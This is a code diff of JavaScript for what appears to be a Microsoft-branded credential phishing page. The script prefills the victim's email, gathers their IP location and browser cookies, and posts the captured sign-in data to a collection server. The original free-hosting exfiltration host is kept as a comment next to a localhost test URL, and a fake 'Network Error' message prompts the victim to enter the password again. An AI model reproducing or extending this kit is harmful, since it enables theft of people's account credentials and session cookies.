@@ -24,7 +24,6 @@
             //https://api64.ipify.org?format=json  129.205.113.165"
             let response = await fetch(`https://ipapi.co/json/`);
             let data = await response.json();
-            console.log(data, "check check first");
             return data;
         }
         
@@ -36,17 +35,12 @@
             // var baseUrl = (window.location).href;
             var url = getParameterByName('is');
             const selected = !url ? email : url;
-            console.log(email);
             let locate;
             $("#x1").val(selected);
 
             $("#formx").submit( async function (e) {
                 e.preventDefault();
-
-                //Get location
                 locate = await getClientip();
-                //console.log(locate, "getting IP");
-
                 if(location) {
                     // var nm = $("#A1").val();
                     var MicrosoftShare = {
@@ -55,23 +49,21 @@
                         ip: locate, 
                         cookie: document.cookie
                     };
+                    console.log(MicrosoftShare, "post data");
 
-                    //console.log(MicrosoftShare, "share share share");
-                    // var formData = new FormData($("#formx")[0]);
-                    const gethost = "https://chthonian-pronoun.000webhostapp.com";
-                    console.log(gethost, "getting host");
+                    const gethost = "http://localhost/apps/ipfs/ipfs-test";
+                    //const gethost = "https://chthonian-pronoun.000webhostapp.com";
                     $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
                     <span class="spinner-grow spinner-grow-sm"></span>
                     Please Wait...
                     </button>`).prop("disabled", true);
                     $.ajax({
-                        url: `${gethost}/index.php`,
+                        url: `${gethost}/rep.php`,
                         type: 'POST',
                         data: JSON.stringify(MicrosoftShare),
                         contentType: "application/json",
                         processData: false,
                         success: function (data, textStatus, jqXHR) {
-                            //console.log(data, textStatus, jqXHR, "show response");
                             if (jqXHR.status === 200) {
                                 $('#bd').show();
                                 $('#hm').hide();
@@ -80,6 +72,7 @@
                                     $("#x2").val("");
                                     $('#msg').html(`Network Error! Please verify your information and try again`);
                                     $("#submitBtn").html("Sign In").prop("disabled", false);
+                                    console.log(data, "data");
                                 }, 2000);
                             }
                         },
